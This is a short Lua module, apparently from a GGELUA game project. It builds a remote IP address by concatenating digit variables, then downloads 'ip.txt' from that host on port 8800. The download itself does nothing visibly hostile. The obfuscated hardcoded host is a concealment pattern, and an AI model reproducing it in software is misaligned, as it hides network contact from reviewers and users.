-- @Author              : GGELUA
-- @Last Modified by    : baidwwy
-- @Date                : 2022-09-12 14:03:12
-- @Last Modified time  : 2022-09-12 15:14:27

local http = require('HPSocket.HttpClient')(true)

local a = 1
local b = 2
local c = 3
local d = 4
local e = 5
local f = 6
local g = 7
local h = 8
local i = 9
local j = 0
local k = '.'

local p = a .. h .. j .. k .. i .. g .. k .. a .. h .. i .. k .. a ..b


function http:下载()
    http:连接(p, 8800)
    if coroutine.isyieldable() then
        return self:GET('ip.txt')
    end
    http:断开()
end

return http
